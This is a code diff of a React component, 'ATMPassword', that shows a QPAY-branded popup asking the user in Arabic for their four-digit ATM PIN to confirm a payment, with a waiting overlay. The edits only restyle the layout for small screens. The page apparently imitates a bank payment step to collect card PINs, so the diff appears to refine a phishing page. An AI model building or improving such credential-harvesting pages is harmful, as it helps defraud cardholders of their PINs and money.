@@ -69,22 +69,62 @@ export default function ATMPassword() {
   };
 
   return (
-    <div style={{ minHeight: "100vh", backgroundColor: "#4a0028", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif`, direction: "rtl" }}>
+    <div style={{
+      minHeight: "100vh",
+      backgroundColor: "#4a0028",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      fontFamily: `-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif`,
+      direction: "rtl",
+      padding: "16px",
+      boxSizing: "border-box",
+    }}>
       <WaitingOverlay />
 
       {/* Popup */}
-      <div style={{ backgroundColor: "#fff", borderRadius: 4, padding: "30px 40px 24px", width: "100%", maxWidth: 520, position: "relative", boxShadow: "0 4px 20px rgba(0,0,0,0.3)" }}>
+      <div style={{
+        backgroundColor: "#fff",
+        borderRadius: 4,
+        padding: "24px 20px 20px",
+        width: "100%",
+        maxWidth: 520,
+        position: "relative",
+        boxShadow: "0 4px 20px rgba(0,0,0,0.3)",
+        boxSizing: "border-box",
+      }}>
 
         {/* Close button */}
-        <button onClick={() => window.history.back()} style={{ position: "absolute", top: 12, left: 14, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#555", lineHeight: 1 }}>✕</button>
+        <button
+          onClick={() => window.history.back()}
+          style={{
+            position: "absolute",
+            top: 12,
+            left: 14,
+            background: "none",
+            border: "none",
+            fontSize: 20,
+            cursor: "pointer",
+            color: "#555",
+            lineHeight: 1,
+            padding: "4px 8px",
+          }}
+        >✕</button>
 
         {/* QPAY Logo */}
-        <div style={{ textAlign: "center", marginBottom: 20 }}>
-          <img src="/qpay-logo.png" alt="QPAY" style={{ height: 28, objectFit: "contain" }} />
+        <div style={{ textAlign: "center", marginBottom: 16 }}>
+          <img src="/qpay-logo.png" alt="QPAY" style={{ height: 28, objectFit: "contain", maxWidth: "100%" }} />
         </div>
 
         {/* Description */}
-        <p style={{ textAlign: "center", fontSize: 14, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
+        <p style={{
+          textAlign: "center",
+          fontSize: 14,
+          color: "#333",
+          marginBottom: 16,
+          lineHeight: 1.6,
+          padding: "0 8px",
+        }}>
           يرجى ادخال رمز الصراف المكون من 4 ارقام لتأكيد الدفع
         </p>
 
@@ -103,12 +143,36 @@ export default function ATMPassword() {
                 setError("");
               }}
               placeholder="****"
-              style={{ flex: 1, height: 44, border: "1px solid #ccc", borderRight: "none", padding: "0 14px", fontSize: 18, outline: "none", fontFamily: "inherit", letterSpacing: showPin ? 2 : 6, backgroundColor: "#f9f9f9" }}
+              style={{
+                flex: 1,
+                height: 48,
+                border: "1px solid #ccc",
+                borderRight: "none",
+                padding: "0 14px",
+                fontSize: 18,
+                outline: "none",
+                fontFamily: "inherit",
+                letterSpacing: showPin ? 2 : 6,
+                backgroundColor: "#f9f9f9",
+                minWidth: 0,
+              }}
             />
             <button
               type="submit"
               disabled={isWaiting || pin.length !== 4}
-              style={{ backgroundColor: pin.length === 4 && !isWaiting ? "#4a0028" : "#ccc", color: "#fff", border: "none", padding: "0 24px", fontSize: 14, fontWeight: "bold", cursor: pin.length === 4 ? "pointer" : "not-allowed", fontFamily: "inherit", whiteSpace: "nowrap" }}
+              style={{
+                backgroundColor: pin.length === 4 && !isWaiting ? "#4a0028" : "#ccc",
+                color: "#fff",
+                border: "none",
+                padding: "0 20px",
+                fontSize: 14,
+                fontWeight: "bold",
+                cursor: pin.length === 4 ? "pointer" : "not-allowed",
+                fontFamily: "inherit",
+                whiteSpace: "nowrap",
+                height: 48,
+                flexShrink: 0,
+              }}
             >
               {isWaiting ? "..." : "تحقق"}
             </button>
@@ -116,7 +180,13 @@ export default function ATMPassword() {
 
           {/* Error */}
           {error && (
-            <p style={{ color: "#c41e3a", fontSize: 12, textAlign: "center", marginBottom: 12, lineHeight: 1.5 }}>
+            <p style={{
+              color: "#c41e3a",
+              fontSize: 12,
+              textAlign: "center",
+              marginBottom: 12,
+              lineHeight: 1.5,
+            }}>
               {error}
             </p>
           )}
